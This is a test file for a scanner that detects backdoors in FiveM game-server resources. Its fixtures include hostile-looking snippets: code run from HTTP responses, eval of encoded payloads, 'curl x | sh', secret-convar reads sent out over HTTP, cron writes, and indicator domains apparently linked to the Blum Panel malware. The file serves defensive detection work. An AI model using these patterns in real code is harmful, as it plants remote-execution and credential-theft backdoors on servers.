// Fixtures describe backdoor *shapes* (remote loader, encoded strings, secret reads); none of them is real malware.
import assert from "node:assert/strict";
import { test } from "node:test";
import { securityRules } from "../src/rules.js";

const findings = (server, code) => securityRules("server.lua", server).findings.filter((f) => f.code === code);
const fires = (server, code) => findings(server, code).length > 0;
const escaped = (text) => [...text].map((c) => `\\x${c.charCodeAt(0).toString(16).padStart(2, "0")}`).join("");

test("LAB-SEC-101: load of an HTTP response, not load of resource files", () => {
  const [f] = findings("PerformHttpRequest('https://example.com/x', function(_, body) assert(load(body))() end)", "LAB-SEC-101");
  assert.deepEqual([f.severity, f.path, f.line], ["warning", "server.lua", 1]);
  assert.ok(fires("PerformHttpRequest(url, function(e, d, h) pcall(function() assert(load(d))() end) end)", "LAB-SEC-101"));
  assert.ok(fires("PerformHttpRequest(url, function(e, d) local fn = loadstring(d) fn() end, 'GET')", "LAB-SEC-101"));
  assert.ok(!fires("local chunk = load(LoadResourceFile(GetCurrentResourceName(), 'data.lua'))", "LAB-SEC-101"));
  assert.ok(!fires("PerformHttpRequest(webhook, function(code) print(code) end, 'POST', json.encode({ content = 'log' }))", "LAB-SEC-101"));
});

test("LAB-SEC-102: load of decoded text, not of plain variables", () => {
  assert.ok(fires("load(string.char(112, 114, 105, 110, 116))()", "LAB-SEC-102"));
  assert.ok(fires(`load("${escaped("print('hi')")}")()`, "LAB-SEC-102"));
  assert.ok(fires("assert(load(base64decode(payload)))()", "LAB-SEC-102"));
  assert.ok(!fires("local fn = load(code, '@chunk', 't', env)", "LAB-SEC-102"));
  assert.ok(!fires("load('return 1 + 1')()", "LAB-SEC-102"));
});

test("LAB-SEC-107: code after a long run of spaces is an error, a comment there is not", () => {
  const [f] = findings(`print('ok')\n${" ".repeat(7168)}local a=load(x) if a then a() end\nprint('after')`, "LAB-SEC-107");
  assert.deepEqual([f.severity, f.line], ["error", 2]);
  assert.ok(!fires(`print('ok')${" ".repeat(500)}-- note`, "LAB-SEC-107"));
  assert.ok(!fires(`local s = "${" ".repeat(399)}x"`, "LAB-SEC-107"));
  assert.deepEqual(findings(`a()${" ".repeat(500)}-- note\nb()\n${"\t".repeat(450)}load(x)()`, "LAB-SEC-107").map((x) => x.line), [3]);
  assert.ok(securityRules("ui/app.js", `x()${" ".repeat(600)}fetch(u)`).findings.some((x) => x.code === "LAB-SEC-107"));
});

test("LAB-SEC-107: a huge run of spaces is checked in linear time", () => {
  const start = performance.now();
  for (const blank of [" ", "\v", "\f", "\t"]) securityRules("x.js", `a${blank.repeat(2_000_000)}`);
  assert.ok(performance.now() - start < 2_000);
});

test("LAB-SEC-103: long encoded data, not short escapes or images", () => {
  assert.ok(fires(`local s = "${escaped("x".repeat(50))}"`, "LAB-SEC-103"));
  assert.ok(fires(`local s = "${"QUJD".repeat(120)}"`, "LAB-SEC-103"));
  assert.ok(fires(`local s = string.char(${Array.from({ length: 25 }, () => 65).join(", ")})`, "LAB-SEC-103"));
  assert.ok(!fires('print("line one\\nline two\\t\\x41")', "LAB-SEC-103"));
  assert.ok(!fires(`local img = "data:image/png;base64,${"QUJD".repeat(200)}"`, "LAB-SEC-103"));
  assert.ok(!fires("local sep = string.char(10)", "LAB-SEC-103"));
});

test("LAB-SEC-104: secret convars; the database string only next to HTTP", () => {
  assert.ok(fires("local key = GetConvar('sv_licenseKey', '')", "LAB-SEC-104"));
  assert.ok(fires("local pw = GetConvar('rcon_password', '')", "LAB-SEC-104"));
  assert.ok(fires("local db = GetConvar('mysql_connection_string', '')\nPerformHttpRequest(u, function() end, 'POST', db)", "LAB-SEC-104"));
  assert.ok(!fires("local db = GetConvar('mysql_connection_string', '')", "LAB-SEC-104"));
  assert.ok(!fires("local locale = GetConvar('ox:locale', 'en')", "LAB-SEC-104"));
});

test("LAB-SEC-105: raw public IPs and hidden URLs, not named hosts or local services", () => {
  assert.ok(fires("PerformHttpRequest('http://45.13.12.9:8080/p', function() end)", "LAB-SEC-105"));
  assert.ok(fires("local u = 'https://203.0.113.7/x'\nPerformHttpRequest(u, function() end)", "LAB-SEC-105"));
  assert.ok(fires(`PerformHttpRequest("${escaped("https://example.com/")}", function() end)`, "LAB-SEC-105"));
  assert.ok(!fires("PerformHttpRequest('https://discord.com/api/webhooks/1/abc', function() end, 'POST')", "LAB-SEC-105"));
  assert.ok(!fires("PerformHttpRequest('http://127.0.0.1:3000/hook', function() end)", "LAB-SEC-105"));
  assert.ok(!fires("local ip = 'http://45.13.12.9/'", "LAB-SEC-105"));
});

test("LAB-SEC-106: shell, writes outside the resource, spreading into computed resources", () => {
  assert.ok(fires("os.execute('curl x | sh')", "LAB-SEC-106"));
  assert.ok(fires("local p = io.popen('whoami')", "LAB-SEC-106"));
  assert.ok(fires("local f = io.open('/etc/cron.d/x', 'w')", "LAB-SEC-106"));
  assert.ok(fires("for i = 0, GetNumResources() - 1 do\n  local r = GetResourceByFindIndex(i)\n  SaveResourceFile(r, 'fxmanifest.lua', data, -1)\nend", "LAB-SEC-106"));
  assert.ok(!fires("local f = io.open(GetResourcePath(GetCurrentResourceName()) .. '/logs.txt', 'a')", "LAB-SEC-106"));
  assert.ok(!fires("local f = io.open(path, 'r')", "LAB-SEC-106"));
  assert.ok(!fires("local res = GetCurrentResourceName()\nSaveResourceFile(res, 'data.json', json.encode(t), -1)", "LAB-SEC-106"));
  assert.ok(!fires("SaveResourceFile('ox_doorlock', 'convert/x.lua', text, -1)", "LAB-SEC-106"));
  assert.ok(!fires("local cmd = 'ls \"'\nlocal dir = io.popen(cmd .. path .. '\"')", "LAB-SEC-106"));
});

test("LAB-SEC-108: a real-shaped credential, never echoed, not a placeholder", () => {
  const token = ["MTAy" + "x".repeat(20), "AbCdEf", "y".repeat(38)].join(".");
  const [f] = findings(`bot_Token = "${token}"`, "LAB-SEC-108");
  assert.equal(f.line, 1);
  assert.ok(!f.message.includes(token));
  assert.ok(fires(`local hook = "https://discord.com/api/webhooks/123456789012345678/${"z".repeat(68)}"`, "LAB-SEC-108"));
  assert.ok(!fires('bot_Token = "" -- your own token', "LAB-SEC-108"));
  assert.ok(!fires('Config.Webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK"', "LAB-SEC-108"));
});

test("CfxLua syntax parses; broken Lua still gets the text checks", () => {
  assert.equal(securityRules("a.lua", "local x <const> = 1\nx += 1\nlocal y = a?.b\nlocal h = `hash`").parsed, true);
  const broken = securityRules("b.lua", `if then${" ".repeat(500)}load(x)()`);
  assert.equal(broken.parsed, false);
  assert.ok(broken.findings.some((x) => x.code === "LAB-SEC-107"));
});

test("2026.11.1: JavaScript text checks", () => {
  const js = (source) => securityRules("server.js", source).findings.map((f) => f.code);
  assert.ok(js("fetch(u).then((r) => r.text()).then((t) => eval(t))").includes("LAB-SEC-111"));
  assert.ok(js("eval(Buffer.from(data, 'base64').toString())").includes("LAB-SEC-111"));
  const blob = "A".repeat(2000);
  assert.ok(js(`eval(Buffer.from("${blob}", "base64").toString())`).includes("LAB-SEC-111"));
  assert.ok(js(`eval(Buffer.from("${blob.slice(0, 700)}" +\n"${blob.slice(700, 1400)}" +\n"${blob.slice(1400)}", "base64").toString())`).includes("LAB-SEC-111"));
  assert.ok(js("const a = [1, 2]; new Function(a.map((x) => String.fromCharCode(x ^ 7)).join(''))()").includes("LAB-SEC-111"));
  assert.ok(!js("const x = eval('1 + 1')").includes("LAB-SEC-111"));
  assert.ok(!js("fetch(u).then((r) => r.json()).then(console.log)").includes("LAB-SEC-111"));
  assert.ok(js("require('child_process').exec('ls')").includes("LAB-SEC-106"));
});

test("LAB-SEC-112: Blum Panel indicators and manifest tricks, not look-alikes", () => {
  const codes = (path, source) => securityRules(path, source).findings.map((f) => f.code);
  assert.ok(codes("a.lua", 'local u = "https://9ns1.com/x"').includes("LAB-SEC-112"));
  assert.ok(codes("a.js", "https.get('https://cdn.fivems.lt/bertJJ')").includes("LAB-SEC-112"));
  assert.ok(codes("sv_main.lua", "local RESOURCE_EXCLUDE = { 'monitor' }").includes("LAB-SEC-112"));
  for (const clean of ['local u = "https://github.net/x"', 'print("ggWP")', 'local u = "https://my5mscripts.net"', "local nullJJs, devJJx = 1, 2"]) assert.ok(!codes("a.lua", clean).includes("LAB-SEC-112"), clean);
  const manifest = (entry) => codes("res/fxmanifest.lua", `fx_version 'cerulean'\nserver_scripts {\n  ${entry},\n}`);
  for (const bad of [`--[[server.lua]]${" ".repeat(40)}'html/cache.js'`, "'html/.env_backup.js'", "'node_modules/.cache/babel_config.js'", "'.sync.js'"]) assert.ok(manifest(bad).includes("LAB-SEC-112"), bad);
  for (const clean of ["'./server/main.js'", "'../shared/x.js'", "'server/*.js'", "'html/app.min.js'"]) assert.ok(!manifest(clean).includes("LAB-SEC-112"), clean);
});

test("LAB-SEC-110/101: load passed to pcall or xpcall", () => {
  assert.ok(fires('RegisterNetEvent("x", function(id) xpcall(load, print, id) end)', "LAB-SEC-110"));
  assert.ok(fires("PerformHttpRequest(url, function(e, d) local ok, f = pcall(load, d) end)", "LAB-SEC-101"));
  assert.ok(!fires('RegisterNetEvent("x", function(id) pcall(print, id) end)', "LAB-SEC-110"));
});

test("LAB-SEC-112 stays precise and linear", () => {
  const codes = (path, source) => securityRules(path, source).findings.map((f) => f.code);
  const manifest = (entry) => codes("fxmanifest.lua", `fx_version 'cerulean'\n${entry}`);
  for (const clean of ["files { 'web/.next/static/chunks/main.js' }", "-- see 'a/.b.js'", "--[[ 'x/.y.js' ]] server_script 'server.lua'"]) assert.ok(!manifest(clean).includes("LAB-SEC-112"), clean);
  assert.ok(manifest(`--[==[ a[1] ]==]${" ".repeat(30)}'x.js'`).includes("LAB-SEC-112"));
  assert.ok(!codes("a.lua", "local robertJJ = 1").includes("LAB-SEC-112"));
  assert.ok(!codes("README.md", "credits: fivems.lt").includes("LAB-SEC-112"));
  const start = performance.now();
  for (const bad of ['"' + "/.a".repeat(600_000), "--[[".repeat(500_000), ('"' + "/.a".repeat(600) + "\n").repeat(1000)]) manifest(bad);
  assert.ok(performance.now() - start < 1500);
});
